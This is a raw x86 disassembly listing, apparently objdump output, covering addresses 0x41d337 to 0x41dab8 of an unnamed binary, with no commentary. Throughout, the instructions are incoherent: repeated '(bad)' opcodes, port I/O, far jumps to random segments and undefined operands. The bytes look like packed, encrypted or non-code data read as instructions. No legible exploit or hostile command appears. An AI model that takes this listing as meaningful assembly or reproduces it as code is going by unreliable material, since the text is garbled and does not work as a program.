  41d337:	sbb    ah,BYTE PTR [ebp+0x61]
  41d33a:	pop    eax
  41d33b:	xlat   BYTE PTR ds:[ebx]
  41d33c:	or     al,0x25
  41d33e:	jno    0x41d342
  41d340:	pop    ecx
  41d341:	ret    
  41d342:	and    ah,dh
  41d344:	out    dx,al
  41d345:	repz sbb bl,BYTE PTR [eax]
  41d348:	ror    DWORD PTR [esi],1
  41d34a:	mov    ebx,0x64fec7f3
  41d34f:	mov    ss,WORD PTR [ebp+0x6a]
  41d352:	jno    0x41d309
  41d354:	iret   
  41d355:	add    DWORD PTR [edx+0x7],eax
  41d358:	xor    DWORD PTR [ecx],esi
  41d35a:	(bad)  
  41d35b:	sub    edi,ecx
  41d35d:	push   ecx
  41d35e:	pop    edi
  41d35f:	push   cs
  41d360:	sbb    BYTE PTR [edx-0x246fdc50],dh
  41d366:	and    al,0xb0
  41d368:	sbb    al,0xe1
  41d36a:	dec    eax
  41d36b:	outs   dx,BYTE PTR ds:[esi]
  41d36c:	mov    edx,0x1b74632a
  41d371:	retf   
  41d372:	add    BYTE PTR [edx-0x46],bh
  41d375:	bound  ecx,QWORD PTR [edx+eax*1]
  41d378:	and    BYTE PTR [edx],dl
  41d37a:	scas   eax,DWORD PTR es:[edi]
  41d37b:	iret   
  41d37c:	sbb    eax,0x486d35bd
  41d381:	aad    0xf
  41d383:	jge    0x41d317
  41d385:	pop    ds
  41d386:	xchg   ah,dh
  41d388:	adc    cl,BYTE PTR [esi-0x3665d928]
  41d38e:	pop    dx
  41d390:	push   ss
  41d391:	js     0x41d399
  41d393:	jbe    0x41d3bc
  41d395:	and    eax,0xb7bf80bb
  41d39a:	(bad)  [esi]
  41d39c:	sub    al,BYTE PTR [ebx+0x2ab2872d]
  41d3a2:	or     cl,BYTE PTR [eax]
  41d3a4:	xor    bl,BYTE PTR [edx]
  41d3a6:	jl     0x41d418
  41d3a8:	les    ecx,FWORD PTR [eax+ecx*2-0xa]
  41d3ac:	add    ebp,edx
  41d3ae:	inc    eax
  41d3af:	xchg   edi,eax
  41d3b0:	mov    ecx,DWORD PTR [ebx]
  41d3b2:	push   esi
  41d3b3:	sub    eax,0xdeca0426
  41d3b8:	and    esi,esi
  41d3ba:	xor    bl,dl
  41d3bc:	jmp    0x41d3d0
  41d3be:	add    eax,0x613b27bf
  41d3c3:	sbb    BYTE PTR [edi],ch
  41d3c5:	mov    eax,0x34b59158
  41d3ca:	push   ds
  41d3cb:	ror    BYTE PTR [edx-0x67122f60],0x38
  41d3d2:	scas   eax,DWORD PTR es:[edi]
  41d3d3:	mov    esp,0x169c2725
  41d3d8:	ret    
  41d3d9:	cwde   
  41d3da:	mov    bh,0x7d
  41d3dc:	jns    0x41d40f
  41d3de:	enter  0xbe18,0x2c
  41d3e2:	loopne 0x41d3c0
  41d3e4:	test   BYTE PTR [edi-0x476d79f6],bl
  41d3ea:	nop
  41d3eb:	fcom   DWORD PTR [edx+0x609adc54]
  41d3f1:	(bad)  [ecx-0x4d]
  41d3f4:	or     ecx,DWORD PTR [eax+eiz*4]
  41d3f7:	fsubr  QWORD PTR [edx]
  41d3f9:	xchg   ecx,eax
  41d3fa:	stc    
  41d3fb:	idiv   DWORD PTR [ecx]
  41d3fd:	outs   dx,DWORD PTR ds:[esi]
  41d3fe:	scas   al,BYTE PTR es:[edi]
  41d3ff:	xor    edx,DWORD PTR [edx-0x1c]
  41d402:	push   cs
  41d403:	(bad)  
  41d404:	pop    ebp
  41d405:	or     DWORD PTR [ebx],0xffffffcf
  41d408:	icebp  
  41d409:	xchg   esi,eax
  41d40a:	adc    BYTE PTR [edi+eax*2+0x3a05b500],bl
  41d411:	gs pop esp
  41d413:	out    0x18,eax
  41d415:	loop   0x41d47e
  41d417:	cmp    esi,ebx
  41d419:	(bad)  
  41d41a:	in     eax,0x7a
  41d41c:	adc    dl,0xdf
  41d41f:	jbe    0x41d48b
  41d421:	fwait
  41d422:	jbe    0x41d3d0
  41d424:	loope  0x41d44a
  41d426:	cmp    ch,BYTE PTR [ecx+edx*8]
  41d429:	xor    BYTE PTR [ebp+0x6e],0xe2
  41d42d:	pushf  
  41d42e:	jp     0x41d426
  41d430:	sbb    DWORD PTR [eax],esi
  41d432:	cli    
  41d433:	jg     0x41d492
  41d435:	mov    edx,0xbb11d711
  41d43a:	int3   
  41d43b:	mov    DWORD PTR [eax+0x227fa132],ebp
  41d441:	cmp    esp,DWORD PTR [ebx]
  41d443:	dec    ebx
  41d444:	cmp    edx,DWORD PTR [eax]
  41d446:	pop    ecx
  41d447:	mov    esi,0x12cc30f1
  41d44c:	ins    DWORD PTR es:[edi],dx
  41d44d:	loopne 0x41d3eb
  41d44f:	adc    bl,dh
  41d451:	jne    0x41d498
  41d453:	(bad)  
  41d454:	in     al,0x41
  41d456:	scas   eax,DWORD PTR es:[edi]
  41d457:	xor    al,0xa2
  41d459:	pop    DWORD PTR [edx+0x147a151c]
  41d45f:	es push esp
  41d461:	(bad)  
  41d462:	push   ds
  41d463:	adc    dl,BYTE PTR [ecx]
  41d465:	pop    edi
  41d466:	fcomp  DWORD PTR [eax+0x63]
  41d469:	mov    ebp,0xa36b508c
  41d46e:	out    dx,eax
  41d46f:	fsub   QWORD PTR [ebx]
  41d471:	xor    eax,0xf496fac5
  41d476:	lds    edi,FWORD PTR [edi-0x68257853]
  41d47c:	and    eax,0xb1902f54
  41d481:	mov    WORD PTR [esi-0x38ea1426],es
  41d487:	xchg   esp,eax
  41d488:	sub    ebp,DWORD PTR [edi+edx*2+0x10]
  41d48c:	mov    ah,0xd7
  41d48e:	inc    eax
  41d48f:	xor    ch,BYTE PTR [edx-0x710bdeac]
  41d495:	push   cs
  41d496:	call   FWORD PTR es:[ecx]
  41d499:	push   ebx
  41d49a:	xchg   edx,eax
  41d49b:	dec    eax
  41d49c:	fstp   DWORD PTR cs:[esi-0x3e98d9f4]
  41d4a3:	in     eax,0xc1
  41d4a5:	jnp    0x41d523
  41d4a7:	push   ebp
  41d4a8:	cmp    al,0x26
  41d4aa:	xor    esi,eax
  41d4ac:	pop    eax
  41d4ad:	sub    DWORD PTR [ebp+0x77],edx
  41d4b0:	sbb    al,bl
  41d4b2:	inc    edi
  41d4b3:	sbb    eax,DWORD PTR [edi+ebp*1]
  41d4b6:	into   
  41d4b7:	nop
  41d4b8:	or     eax,0x965cf97a
  41d4bd:	add    BYTE PTR [eax],al
  41d4bf:	add    BYTE PTR [eax],al
  41d4c1:	add    dl,ah
  41d4c3:	or     al,BYTE PTR [ecx]
  41d4c5:	xchg   ecx,eax
  41d4c6:	jmp    0xbdbdc766
  41d4cb:	adc    esp,esi
  41d4cd:	pop    edi
  41d4ce:	mov    DWORD PTR [edx],eax
  41d4d0:	pop    ebx
  41d4d1:	push   ss
  41d4d2:	xor    al,0x50
  41d4d4:	add    DWORD PTR [eax],eax
  41d4d6:	repz add al,0x0
  41d4d9:	add    ah,al
  41d4db:	addr16 daa 
  41d4dd:	ss mov edi,0x91ce6747
  41d4e3:	push   0xf911c2ec
  41d4e8:	das    
  41d4e9:	das    
  41d4ea:	stos   DWORD PTR es:[edi],eax
  41d4eb:	mov    DWORD PTR [edx+edi*8-0x588a1c7f],edx
  41d4f2:	cmp    BYTE PTR [eax],bh
  41d4f4:	sub    eax,0xc7c6a74c
  41d4f9:	int    0x87
  41d4fb:	sbb    esp,esi
  41d4fd:	ss xor al,0xba
  41d500:	jge    0x41d4a7
  41d502:	out    dx,al
  41d503:	mov    bl,0x2e
  41d505:	push   esp
  41d506:	push   ds
  41d507:	sub    al,BYTE PTR [edx]
  41d509:	adc    al,0x4c
  41d50b:	neg    DWORD PTR [esi+0x24714a93]
  41d511:	mov    bl,0x59
  41d513:	(bad)  
  41d514:	je     0x41d49f
  41d516:	sub    cl,cl
  41d518:	mov    esi,0xa5302bc9
  41d51d:	inc    edi
  41d51e:	inc    esi
  41d51f:	cmp    edi,DWORD PTR [ebp-0x7d]
  41d522:	(bad)  
  41d523:	(bad)  
  41d524:	dec    esp
  41d525:	std    
  41d526:	out    dx,eax
  41d527:	imul   ebp,DWORD PTR ds:0xba965ffb,0x8ee61516
  41d531:	stos   DWORD PTR es:[edi],eax
  41d532:	jmp    0xc5f77820
  41d537:	cmc    
  41d538:	sbb    al,0xfc
  41d53a:	ins    DWORD PTR es:[edi],dx
  41d53b:	stc    
  41d53c:	cmc    
  41d53d:	sub    al,BYTE PTR [esi-0x62d56902]
  41d543:	sub    eax,edx
  41d545:	bound  esp,QWORD PTR [ebp-0x4d794551]
  41d54b:	loopne 0x41d56c
  41d54d:	sti    
  41d54e:	push   es
  41d54f:	push   esp
  41d550:	ss xchg esp,eax
  41d552:	mov    dl,0x56
  41d554:	push   cs
  41d555:	(bad)  
  41d556:	dec    ecx
  41d557:	sbb    BYTE PTR [edx-0x5c],0x8f
  41d55b:	pushf  
  41d55c:	fisub  DWORD PTR [ecx]
  41d55e:	popa   
  41d55f:	idiv   DWORD PTR [ebp-0x238b774c]
  41d565:	push   eax
  41d566:	xchg   ebx,eax
  41d567:	retf   0xbfd6
  41d56a:	mov    ch,0x1e
  41d56c:	pop    ss
  41d56d:	shl    DWORD PTR [edx-0x7eea3bb8],cl
  41d573:	fs popa 
  41d575:	sbb    BYTE PTR [edi+eax*8],0x1f
  41d579:	data16 mov ch,0xc
  41d57c:	out    0xe6,eax
  41d57e:	adc    edx,DWORD PTR [edi-0x70648d24]
  41d584:	imul   ebp,DWORD PTR [edi+0x30],0x1c25ed7a
  41d58b:	push   ebp
  41d58c:	push   cs
  41d58d:	inc    edi
  41d58e:	adc    al,0xe7
  41d590:	mov    dh,0x91
  41d592:	jg     0x41d592
  41d594:	cmp    al,bh
  41d596:	icebp  
  41d597:	dec    ebx
  41d598:	mov    dl,ch
  41d59a:	stos   DWORD PTR es:[edi],eax
  41d59b:	and    ah,BYTE PTR [eax]
  41d59d:	mov    WORD PTR [ecx-0x5606abaf],ss
  41d5a3:	enter  0xe14c,0xd6
  41d5a7:	xchg   edx,eax
  41d5a8:	pop    esp
  41d5a9:	dec    esp
  41d5aa:	call   0x7731:0xc7f937d9
  41d5b1:	mov    eax,DWORD PTR [ebp+0x11701279]
  41d5b7:	retf   
  41d5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5b9:	mov    dh,0x8b
  41d5bb:	out    dx,al
  41d5bc:	pop    ss
  41d5bd:	arpl   WORD PTR [esi-0x44],di
  41d5c0:	aam    0x67
  41d5c2:	data16 cld 
  41d5c4:	imul   ecx,DWORD PTR [edx-0x74],0xfffffff5
  41d5c8:	imul   edi,DWORD PTR ds:0xfd2e179c,0x1a37aa94
  41d5d2:	daa    
  41d5d3:	mov    ecx,0x62afafb5
  41d5d8:	jo     0x41d56b
  41d5da:	frstor [esi-0x14]
  41d5dd:	adc    BYTE PTR [ebp-0x2d],cl
  41d5e0:	inc    esp
  41d5e1:	mov    dh,0x4b
  41d5e3:	add    ebp,DWORD PTR [edi+0x71a3957d]
  41d5e9:	jge    0x41d5a1
  41d5eb:	xor    DWORD PTR [ebp+0x3be7f25a],0x9b0c6c91
  41d5f5:	dec    BYTE PTR [ebx]
  41d5f7:	pop    edx
  41d5f8:	ficom  DWORD PTR [esi]
  41d5fa:	ins    BYTE PTR es:[edi],dx
  41d5fb:	push   ebx
  41d5fc:	mov    al,0x46
  41d5fe:	inc    esi
  41d5ff:	jmp    0x51c5e565
  41d604:	xor    al,0x8c
  41d606:	push   esp
  41d607:	pusha  
  41d608:	imul   esp,DWORD PTR ds:0xc1c2f947,0xffffffd6
  41d60f:	call   0x1694:0x8af500a9
  41d616:	test   al,0x91
  41d618:	je     0x41d5fd
  41d61a:	dec    esp
  41d61b:	sbb    al,0xe9
  41d61d:	push   0x9e307b66
  41d622:	dec    edx
  41d623:	shl    DWORD PTR [ebp-0x1c69e1b4],cl
  41d629:	push   ecx
  41d62a:	ja     0x41d5b8
  41d62c:	jno    0x41d682
  41d62e:	sbb    eax,0x1a5d01c7
  41d633:	fld    QWORD PTR [edx+0x3c]
  41d636:	ja     0x41d681
  41d638:	or     eax,0xb6352012
  41d63d:	xor    ch,ah
  41d63f:	stc    
  41d640:	and    BYTE PTR [ecx+0x53f308ff],dh
  41d646:	in     al,0x69
  41d648:	inc    edx
  41d649:	in     al,dx
  41d64a:	push   ebp
  41d64b:	cmp    ecx,0x6056fe62
  41d651:	adc    eax,DWORD PTR [edi-0xa]
  41d654:	(bad)  
  41d655:	mov    ds:0x9800d0c2,eax
  41d65a:	mov    WORD PTR [ecx+0x5cdf1050],ds
  41d660:	call   0x9fd2:0x1e7887a4
  41d667:	loop   0x41d62b
  41d669:	cwde   
  41d66a:	cli    
  41d66b:	fcom   DWORD PTR [ecx]
  41d66d:	bound  ebx,QWORD PTR [eax]
  41d66f:	sbb    BYTE PTR [esi+ebp*2],dh
  41d672:	loop   0x41d63a
  41d674:	(bad)  
  41d675:	in     al,dx
  41d676:	inc    BYTE PTR [eax-0x26d84632]
  41d67c:	je     0x41d61a
  41d67e:	retf   
  41d67f:	lods   eax,DWORD PTR ds:[esi]
  41d680:	xor    DWORD PTR [ecx],esp
  41d682:	in     eax,dx
  41d683:	xchg   esp,eax
  41d684:	cs clc 
  41d686:	shl    BYTE PTR [edx-0x5fc1420a],0x4e
  41d68d:	sahf   
  41d68e:	lahf   
  41d68f:	mov    esp,0x1df64339
  41d694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d695:	shl    DWORD PTR [edx+0x4e1d06b4],0x65
  41d69c:	or     esp,edi
  41d69e:	mov    bl,0xf0
  41d6a0:	shl    BYTE PTR [eax-0x69],cl
  41d6a3:	es in  al,0xc5
  41d6a6:	(bad)  
  41d6a7:	lahf   
  41d6a8:	imul   edi,DWORD PTR [edx+0x33],0xc
  41d6ac:	clc    
  41d6ad:	push   0xfffffffa
  41d6af:	push   es
  41d6b0:	cmp    ch,BYTE PTR [ebx]
  41d6b2:	mov    ebx,0x8ca41e09
  41d6b7:	jp     0x41d737
  41d6b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6ba:	pop    ecx
  41d6bb:	fwait
  41d6bc:	pop    esp
  41d6bd:	mov    ebp,0x99b26404
  41d6c2:	repz mov esp,0x8c0d0240
  41d6c8:	popa   
  41d6c9:	pop    esi
  41d6ca:	stos   BYTE PTR es:[edi],al
  41d6cb:	mov    edi,0xd54bab6e
  41d6d0:	dec    ebp
  41d6d1:	(bad)  
  41d6d2:	and    ch,bh
  41d6d4:	mov    bh,0x9a
  41d6d6:	xor    eax,0xcf4985e3
  41d6db:	mov    esp,0x15e5a8ab
  41d6e0:	test   DWORD PTR [ebx+0xd028e65],0xf61c5d93
  41d6ea:	and    al,BYTE PTR gs:[ecx]
  41d6ed:	mov    ebx,0x7254930
  41d6f2:	or     BYTE PTR [edx-0x13],bl
  41d6f5:	inc    ecx
  41d6f6:	adc    DWORD PTR [eax+eax*1-0x60],edx
  41d6fa:	xchg   edi,eax
  41d6fb:	pop    ecx
  41d6fc:	and    cl,BYTE PTR [edx-0x6cf6ae7f]
  41d702:	push   esp
  41d703:	sbb    DWORD PTR gs:[edx-0x13],esp
  41d707:	jge    0x41d6ad
  41d709:	mov    edi,0x2d8a474d
  41d70f:	in     eax,dx
  41d710:	jmp    0xfb7651d6
  41d715:	int    0x9a
  41d717:	stos   BYTE PTR es:[edi],al
  41d718:	lahf   
  41d719:	into   
  41d71a:	inc    eax
  41d71b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d71c:	or     al,0x7a
  41d71e:	mov    al,ds:0x2b7c65f6
  41d723:	and    edx,ebx
  41d725:	xchg   DWORD PTR [ebx+0x906598b],edx
  41d72b:	xchg   esp,eax
  41d72c:	adc    eax,0xe4008a1f
  41d731:	ret    0x152a
  41d734:	in     eax,dx
  41d735:	add    eax,0x235f08ea
  41d73a:	sbb    dl,dh
  41d73c:	or     al,0xb
  41d73e:	lea    edx,[esi]
  41d740:	inc    edx
  41d741:	jns    0x41d76d
  41d743:	add    BYTE PTR [edi+0x76],dl
  41d746:	test   BYTE PTR [ebp+0x14],cl
  41d749:	mov    cl,BYTE PTR [edx-0xe5ea9a3]
  41d74f:	jmp    0xd4312ea
  41d754:	addr16 jle 0x41d765
  41d757:	rcr    BYTE PTR [esi+0x3525aaaa],0xb0
  41d75e:	push   edx
  41d75f:	jnp    0x41d784
  41d761:	jne    0x41d7c4
  41d763:	je     0x41d70a
  41d765:	jnp    0x41d76d
  41d767:	dec    ecx
  41d768:	bound  ebp,QWORD PTR [ecx-0x23135719]
  41d76e:	inc    ecx
  41d76f:	sbb    edi,0xc4d1a8a
  41d775:	sub    bh,dh
  41d777:	pop    ebx
  41d778:	mov    ch,0x44
  41d77a:	aaa    
  41d77b:	dec    edx
  41d77c:	inc    esi
  41d77d:	xlat   BYTE PTR ds:[ebx]
  41d77e:	fistp  QWORD PTR [ebx+0x77]
  41d781:	(bad)  
  41d782:	retf   
  41d783:	sbb    BYTE PTR [ecx+0x3173d6ac],dh
  41d789:	adc    eax,DWORD PTR [ecx]
  41d78b:	xchg   edx,eax
  41d78c:	das    
  41d78d:	lahf   
  41d78e:	mov    ds:0x78da1ba,al
  41d793:	jmp    0xf16:0xaacadd9f
  41d79a:	sbb    al,0x68
  41d79c:	ret    
  41d79d:	(bad)  
  41d79f:	push   esi
  41d7a0:	xchg   edi,eax
  41d7a1:	push   es
  41d7a2:	jbe    0x41d81d
  41d7a4:	retf   
  41d7a5:	out    dx,eax
  41d7a6:	mov    eax,0xe7d60cfb
  41d7ab:	cs jbe 0x41d751
  41d7ae:	cld    
  41d7af:	clc    
  41d7b0:	leave  
  41d7b1:	sbb    ecx,DWORD PTR [ebp-0x6c752d77]
  41d7b7:	cmc    
  41d7b8:	and    al,dl
  41d7ba:	or     DWORD PTR [esp+ecx*4],eax
  41d7bd:	outs   dx,DWORD PTR ds:[esi]
  41d7be:	xchg   ebp,eax
  41d7bf:	pop    ebx
  41d7c0:	arpl   WORD PTR [ebx],si
  41d7c2:	imul   esi
  41d7c4:	es dec esp
  41d7c6:	pop    edi
  41d7c7:	es inc eax
  41d7c9:	loope  0x41d795
  41d7cb:	mov    ah,0xd4
  41d7cd:	mov    ds:0xbab108ad,eax
  41d7d2:	test   BYTE PTR [ebp+0x22e39aaa],dh
  41d7d8:	addr16 iret 
  41d7da:	shl    BYTE PTR [esi+eiz*2-0x5c7fc2cf],0x90
  41d7e2:	jb     0x41d7a0
  41d7e4:	and    BYTE PTR [ebp+0x4017af5a],ah
  41d7ea:	cmp    al,0x17
  41d7ec:	sub    eax,0x4646c0d7
  41d7f1:	call   FWORD PTR [ecx+0x65fda1a]
  41d7f7:	retf   
  41d7f8:	sub    ah,BYTE PTR [ebp+edx*1-0x13]
  41d7fc:	push   ebp
  41d7fd:	mov    DWORD PTR [esi-0x7f99fb1f],esi
  41d803:	nop
  41d804:	mov    dl,0x96
  41d806:	push   ebp
  41d807:	inc    ecx
  41d808:	pop    eax
  41d809:	xor    al,0x32
  41d80b:	jns    0x41d820
  41d80d:	push   edi
  41d80e:	aad    0xbc
  41d810:	mov    ecx,DWORD PTR [esi-0xaf04af2]
  41d816:	cmp    eax,eax
  41d818:	retf   
  41d819:	dec    eax
  41d81a:	jo     0x41d847
  41d81c:	out    dx,eax
  41d81d:	test   BYTE PTR [ecx+ebp*4+0x628ec864],al
  41d824:	stos   BYTE PTR es:[edi],al
  41d825:	ficom  WORD PTR [eax]
  41d827:	add    BYTE PTR [ecx-0x1f93a5d4],ch
  41d82d:	push   ecx
  41d82e:	cld    
  41d82f:	fwait
  41d830:	out    dx,al
  41d831:	sub    eax,edi
  41d833:	push   edi
  41d834:	fist   WORD PTR [eax-0x15]
  41d837:	push   ebp
  41d838:	mov    ch,0x0
  41d83a:	jne    0x41d85a
  41d83c:	adc    DWORD PTR [edx-0x7897c9ca],0xffffffe9
  41d843:	inc    ebp
  41d844:	adc    BYTE PTR [ebx],bh
  41d846:	lea    ebp,[eax-0x20]
  41d849:	ret    0x1933
  41d84c:	sub    DWORD PTR [ebp+0x4b],ebx
  41d84f:	mov    WORD PTR [ebp-0x3b],?
  41d852:	inc    edi
  41d853:	xchg   ecx,eax
  41d854:	and    al,0xe2
  41d856:	xor    eax,0x2bebd5b6
  41d85b:	ins    DWORD PTR es:[edi],dx
  41d85c:	mov    eax,0x436317ad
  41d861:	ss and al,0x0
  41d864:	mov    bh,0xc8
  41d866:	mov    ebx,0x507c6d56
  41d86b:	or     al,0x7f
  41d86d:	out    0x36,al
  41d86f:	cli    
  41d870:	dec    ebx
  41d871:	arpl   WORD PTR [edi*1+0x66da9403],si
  41d878:	in     al,dx
  41d879:	and    al,0x9c
  41d87b:	aad    0xf2
  41d87d:	push   cs
  41d87e:	xchg   edx,eax
  41d87f:	lds    ebx,FWORD PTR [eax-0x4d]
  41d882:	add    esi,DWORD PTR [ecx-0x3a]
  41d885:	sbb    BYTE PTR [edi-0x7fce351c],0x8f
  41d88c:	push   edx
  41d88d:	rol    dl,cl
  41d88f:	mov    DWORD PTR [ebx-0x458da8a7],ebp
  41d895:	sub    DWORD PTR [edx-0x37cb89cb],edi
  41d89b:	stc    
  41d89c:	mov    ah,0xc
  41d89e:	lea    esi,[esi+0x643a7d3f]
  41d8a4:	mov    esi,ecx
  41d8a6:	fwait
  41d8a7:	ds push ebp
  41d8a9:	add    al,0xee
  41d8ab:	cmp    esi,eax
  41d8ad:	adc    DWORD PTR [edi-0x2675322],eax
  41d8b3:	mov    ch,0x78
  41d8b5:	in     al,0xe5
  41d8b7:	retf   0x67f4
  41d8ba:	mov    eax,0xd6865766
  41d8bf:	mov    ah,0x53
  41d8c1:	sbb    ah,BYTE PTR [esi]
  41d8c3:	fld    DWORD PTR [esp+esi*1]
  41d8c6:	es pop ebp
  41d8c8:	ds jg  0x41d916
  41d8cb:	mov    ch,0xec
  41d8cd:	dec    esi
  41d8ce:	ins    DWORD PTR es:[edi],dx
  41d8cf:	out    dx,eax
  41d8d0:	lock pop edi
  41d8d2:	push   edx
  41d8d3:	adc    DWORD PTR [edx+ecx*1+0x78b45bc9],0x326577d9
  41d8de:	jecxz  0x41d8d2
  41d8e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8e1:	mov    ecx,0x9e505fe2
  41d8e6:	(bad)  
  41d8e7:	fisttp WORD PTR [ebx-0x208e1bfd]
  41d8ed:	arpl   di,si
  41d8ef:	test   BYTE PTR [ebx+0x11743e83],ch
  41d8f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8f6:	cmp    esi,DWORD PTR [edi-0x18dd2e28]
  41d8fc:	loop   0x41d8e4
  41d8fe:	pop    ebp
  41d8ff:	leave  
  41d900:	outs   dx,BYTE PTR ds:[esi]
  41d901:	addr16 jae 0x41d95a
  41d904:	in     al,dx
  41d905:	loopne 0x41d8b7
  41d907:	mov    esi,0x48f47264
  41d90c:	test   DWORD PTR [edx],ecx
  41d90e:	sub    eax,0xb5336a8e
  41d913:	push   ss
  41d914:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d916:	mov    edi,0xd25fb47e
  41d91b:	jo     0x41d954
  41d91d:	ror    DWORD PTR [ecx-0x2e2384e2],1
  41d923:	in     eax,0xc2
  41d925:	push   ebx
  41d926:	repnz aaa 
  41d928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d929:	or     eax,0xc35328dc
  41d92e:	or     DWORD PTR [esi+0x474bd8ed],eax
  41d934:	push   esi
  41d935:	mov    cl,0xf4
  41d937:	jmp    0xdc1c:0xc82c97f7
  41d93e:	sub    eax,0x66c74122
  41d943:	jl     0x41d8f0
  41d945:	data16 mov BYTE PTR [ebx-0x1e],cl
  41d949:	mov    fs:0xa363fe98,eax
  41d94f:	pop    ebx
  41d950:	js     0x41d8ed
  41d952:	arpl   si,si
  41d954:	or     DWORD PTR [ebx-0x7],ecx
  41d957:	das    
  41d958:	dec    edi
  41d959:	sub    BYTE PTR [ecx+0x4a],0x6
  41d95d:	ds retf 0xb513
  41d961:	jo     0x41d98e
  41d963:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d964:	jmp    0x6421:0xe2466a0c
  41d96b:	dec    ecx
  41d96c:	pop    esi
  41d96d:	jo     0x41d8f4
  41d96f:	sbb    DWORD PTR [edx],ebp
  41d971:	jnp    0x41d9ce
  41d973:	(bad)
  41d976:	push   ecx
  41d977:	imul   eax,DWORD PTR [ecx-0x19],0x6c
  41d97b:	add    al,0x64
  41d97d:	stc    
  41d97e:	add    dl,BYTE PTR [edi+0x4769fb64]
  41d984:	outs   dx,BYTE PTR ds:[esi]
  41d985:	lahf   
  41d986:	mov    ?,WORD PTR [edx]
  41d988:	xlat   BYTE PTR ds:[ebx]
  41d989:	inc    ecx
  41d98a:	call   0xa1846453
  41d98f:	ja     0x41d9ec
  41d991:	cmp    esi,edi
  41d993:	and    al,0x8e
  41d995:	pop    esp
  41d996:	cmp    eax,0xc2fecaf
  41d99b:	pop    ebx
  41d99c:	into   
  41d99d:	outs   dx,BYTE PTR ds:[esi]
  41d99e:	pusha  
  41d99f:	xor    DWORD PTR [esi+0x1d6f0cf1],ebp
  41d9a5:	push   0xffffffab
  41d9a7:	or     ecx,DWORD PTR [edx-0x3cb434db]
  41d9ad:	rol    BYTE PTR [ebp+0x46],0x95
  41d9b1:	mov    dh,0x45
  41d9b3:	pop    edx
  41d9b4:	in     eax,dx
  41d9b5:	scas   eax,DWORD PTR es:[edi]
  41d9b6:	loope  0x41d96e
  41d9b8:	ds loope 0x41d9a5
  41d9bb:	ret    
  41d9bc:	and    eax,0x36cb36e9
  41d9c1:	or     DWORD PTR [esi],edi
  41d9c3:	xor    bl,dh
  41d9c5:	mov    dh,0xbd
  41d9c7:	cmp    eax,0xacba9b98
  41d9cc:	ins    DWORD PTR es:[edi],dx
  41d9cd:	add    BYTE PTR [eax],al
  41d9cf:	add    BYTE PTR [eax],al
  41d9d1:	add    BYTE PTR [esi+0x5e],bl
  41d9d4:	loope  0x41da44
  41d9d6:	loope  0x41d9d7
  41d9d8:	fistp  QWORD PTR [esi-0x6e]
  41d9db:	adc    DWORD PTR [esi],0xa
  41d9de:	inc    esi
  41d9df:	pop    ebp
  41d9e0:	push   cs
  41d9e1:	pop    ebp
  41d9e2:	daa    
  41d9e3:	push   ebp
  41d9e4:	add    DWORD PTR [eax],eax
  41d9e6:	repz add al,0x0
  41d9e9:	add    cl,bh
  41d9eb:	sub    BYTE PTR ds:0x63ba8912,dl
  41d9f1:	dec    ecx
  41d9f2:	popf   
  41d9f3:	imul   ah
  41d9f5:	adc    DWORD PTR [edi-0x80],0xffffffc8
  41d9f9:	inc    esp
  41d9fa:	pop    ecx
  41d9fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9fc:	and    esi,DWORD PTR [ebp-0x24]
  41d9ff:	adc    bh,BYTE PTR [ebx+0x589d011a]
  41da05:	mov    ah,0xaa
  41da07:	es xor al,0xd
  41da0a:	sbb    DWORD PTR [edi+ebp*2],eax
  41da0d:	xlat   BYTE PTR ds:[ebx]
  41da0e:	and    al,0x5d
  41da10:	mov    bl,0xe4
  41da12:	mov    esi,0x8e685a9
  41da17:	jmp    0x681c:0x73b3a775
  41da1e:	mov    bl,0x15
  41da20:	dec    ebx
  41da21:	mov    eax,0x9a5e495a
  41da26:	cmp    edi,ecx
  41da28:	pop    ecx
  41da29:	shr    bh,0x86
  41da2c:	cmp    cl,bh
  41da2e:	inc    edi
  41da2f:	cdq    
  41da30:	dec    esp
  41da31:	les    edx,FWORD PTR [edx+0x74]
  41da34:	push   edx
  41da35:	push   esi
  41da36:	out    0xdd,eax
  41da38:	nop
  41da39:	jge    0x41daad
  41da3b:	xchg   esp,eax
  41da3c:	repnz xchg ebx,eax
  41da3e:	hlt    
  41da3f:	and    bl,BYTE PTR ds:0xed587b8e
  41da45:	push   ecx
  41da46:	mov    ds:0x7025006d,eax
  41da4b:	nop
  41da4c:	cmc    
  41da4d:	add    BYTE PTR [ebp+0x5e59fef8],ah
  41da53:	adc    ch,BYTE PTR [esi-0x15a503c]
  41da59:	add    bh,dh
  41da5b:	add    ebx,0x971c1e75
  41da61:	mov    ds:0x890d1ef1,eax
  41da66:	push   esi
  41da67:	mov    esp,0xf719f6ff
  41da6c:	loopne 0x41da06
  41da6e:	sbb    BYTE PTR [edi+0x67],0x5a
  41da72:	sahf   
  41da73:	into   
  41da74:	aam    0xe6
  41da76:	and    edx,DWORD PTR [eax]
  41da78:	pop    esi
  41da79:	mov    cl,BYTE PTR [esi+0x1f4e0426]
  41da7f:	sar    DWORD PTR [eax+ebx*4],1
  41da82:	inc    eax
  41da83:	dec    edi
  41da84:	mov    cl,0xad
  41da86:	hlt    
  41da87:	dec    esi
  41da88:	bound  edx,QWORD PTR [esi-0x40]
  41da8b:	dec    esp
  41da8c:	xor    BYTE PTR [esi],bh
  41da8e:	(bad)  
  41da8f:	out    0xf9,al
  41da91:	popa   
  41da92:	inc    ebx
  41da93:	sbb    BYTE PTR [edx],0x3c
  41da96:	icebp  
  41da97:	(bad)  
  41da98:	cmp    al,0xdf
  41da9a:	cmp    esp,DWORD PTR [edi]
  41da9c:	enter  0xae42,0xfd
  41daa0:	loopne 0x41daa1
  41daa2:	ss jmp 0x45f2:0x4c447274
  41daaa:	dec    edx
  41daab:	xchg   ebp,eax
  41daac:	pusha  
  41daad:	push   ss
  41daae:	sbb    ebp,DWORD PTR [esi-0x67]
  41dab1:	imul   ebp
  41dab3:	out    0xec,eax
  41dab5:	test   al,0x78
  41dab7:	inc    eax
  41dab8:	and    al,al
